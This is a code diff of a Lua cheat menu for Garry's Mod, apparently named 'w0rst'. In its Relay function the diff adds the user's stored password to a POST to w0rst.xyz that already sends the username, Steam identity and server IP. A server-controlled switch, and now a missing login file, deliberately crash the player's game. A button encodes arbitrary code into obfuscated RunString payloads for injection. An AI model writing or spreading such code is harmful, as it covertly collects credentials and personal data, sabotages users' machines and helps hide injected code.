@@ -63,17 +63,23 @@ local responses = {
 }
 
 local function Relay()
-    local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
+    if not file.Exists("w0rst/login.txt", "DATA") then
+        local function crash() return crash() end crash()
+        return
+    end
+    
     local lp = LocalPlayer()
+    local UserInfo = string.Split(file.Read("w0rst/login.txt"), ":")
     http.Post("https://w0rst.xyz/api/relay.php", {
         username=UserInfo[1],
+        password=UserInfo[2],
         steam_name=lp:Name(),
         steam_id=lp:SteamID(),
         server_name=GetHostName(),
         server_ip=game.GetIPAddress() }, function(b)
         local s = string.Split(b, " ");
         if(s[1] == "a4dF91aE25c2BFD11F879e42") then
-            function die() return die() end die()
+            local function crash() return crash() end crash()
         end
     end)
 end
@@ -368,6 +374,8 @@ local function CreateCheckbox(name, tab, x, y, func)
     Checkbox.Paint = function(self, w, h)
         self:SetTextColor(Color(255,255,255))
     end
+
+
 end
 
 local function CreateSlider(name, table, tab, max, min, x, y)
@@ -1764,7 +1772,7 @@ end)
 CreateButton("Encode-String", MiscTab[1], 110, 25, 380, 40, function()
     Derma_StringRequest("Encode String", "String To Encode", "", function(str)
         local encoded = str:gsub(".", function(bb) return "\\" .. bb:byte() end)
-        wtf.conoutRGB("ENCODED-STRING: ".."RunString("..encoded..")")
+        wtf.conoutRGB("ENCODED-STRING: ".."RunString('"..encoded.."')")
         SetClipboardText("RunString('"..encoded.."')")
         wtf.Log("Check Console")
       end)
